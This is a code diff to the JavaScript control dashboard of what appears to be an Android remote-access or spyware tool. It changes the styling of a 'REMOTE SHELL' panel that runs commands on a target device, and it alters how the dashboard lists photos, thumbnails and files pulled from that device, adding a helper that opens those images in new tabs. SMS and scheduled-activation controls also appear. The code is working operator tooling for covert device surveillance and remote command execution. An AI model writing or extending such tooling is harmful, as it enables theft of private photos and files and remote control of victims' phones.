@@ -134,8 +134,9 @@ function injectAdvancedControls() {
     timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
     controlMatrixCard.after(timeW);
 
+    // SHELL with styled output
     const shellW = document.createElement('div'); shellW.className = 'shell-control-wrapper';
-    shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;"></pre>`;
+    shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;background:#050510;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;font-family:'Courier New',monospace;line-height:1.5;border:1px solid #1a3a1a;"></pre>`;
     timeW.after(shellW);
 
     const smsW = document.createElement('div'); smsW.className = 'shell-control-wrapper';
@@ -351,27 +352,28 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = p.slice(0,30).map(p => {
             const thumb = p.thumbnail_url || '';
             const imgHtml = thumb
-                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="window.open(this.src,'_blank')" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
                    <div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div>`
                 : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
             return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
         }).join('');
     });
 
-    // ── SHELL OUTPUT ─────────────────────────────────
+    // ── SHELL OUTPUT (styled terminal) ───────────────
     listenToFeed(uid, 'shell_output', (d) => {
         const o = document.getElementById('shell-output'); if(!o||!d) return;
         o.style.display = 'block';
-        let text = `$ ${d.command||''}\n\n`;
+        let text = '$ ' + (d.command||'') + '\n\n';
         if(d.exit_code === -999) {
             text += '⏳ Executing...\n';
         } else {
             text += (d.stdout || '(no output)');
-            if(d.stderr) text += `\n\nSTDERR:\n${d.stderr}`;
-            text += `\n\nExit code: ${d.exit_code ?? '?'}`;
+            if(d.stderr) text += '\n\nSTDERR:\n' + d.stderr;
+            text += '\n\nExit code: ' + (d.exit_code ?? '?');
             if(d.timed_out) text += ' ⚠️ TIMED OUT';
         }
         o.textContent = text;
+        o.scrollTop = o.scrollHeight;
     });
 
     // ── FILE BROWSER WITH NAVIGATION + IMAGE/VIDEO PREVIEWS ─
@@ -389,7 +391,7 @@ function initializeDataFeedListeners(uid) {
             let html = '<div style="margin-bottom:10px;">';
             if(d.preview_url) {
                 var isVid = (d.file_type === 'video');
-                html += '<div style="position:relative;display:inline-block;cursor:pointer;" onclick="window.open(\'' + d.preview_url.replace(/'/g,"\\'") + '\',\'_blank\')">';
+                html += '<div style="position:relative;display:inline-block;cursor:pointer;" onclick="openPreview(this.querySelector(\'img\').src)">';
                 html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;display:block;" loading="lazy">';
                 if(isVid) {
                     html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
@@ -442,7 +444,7 @@ function initializeDataFeedListeners(uid) {
                 html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;' + hiddenStyle + '">';
                 if(e.preview_url) {
                     var isVideoFile = (e.icon === '🎬');
-                    html += '<div style="position:relative;width:50px;height:50px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();window.open(\'' + e.preview_url.replace(/'/g,"\\'") + '\',\'_blank\')">';
+                    html += '<div style="position:relative;width:50px;height:50px;flex-shrink:0;cursor:pointer;" onclick="event.stopPropagation();openPreview(this.querySelector(\'img\').src)">';
                     html += '<img src="' + e.preview_url + '" style="width:50px;height:50px;object-fit:cover;border-radius:4px;display:block;" loading="lazy">';
                     if(isVideoFile) {
                         html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;">';
@@ -565,6 +567,31 @@ function listenToFeed(uid, path, cb) {
     if(deviceListeners[k]) off(deviceListeners[k]);
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
+
+// ── OPEN PREVIEW IN NEW TAB (Blob URL — works on mobile) ──
+window.openPreview = function(src) {
+    if(!src) return;
+    try {
+        // If it's a data URL, convert to Blob for mobile compatibility
+        if(src.startsWith('data:')) {
+            var byteString = atob(src.split(',')[1]);
+            var mimeString = src.split(',')[0].split(':')[1].split(';')[0];
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for(var i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            var blob = new Blob([ab], {type: mimeString});
+            var url = URL.createObjectURL(blob);
+            var w = window.open(url, '_blank');
+            if(w) setTimeout(function(){ URL.revokeObjectURL(url); }, 60000);
+            else alert('Allow popups to view previews');
+        } else {
+            window.open(src, '_blank');
+        }
+    } catch(e) {
+        console.error('Preview open failed:', e);
+        window.open(src, '_blank');
+    }
+};
 
 // ── FILE BROWSER NAVIGATION ──────────────────────────
 window.navigateToFile = function(path) {
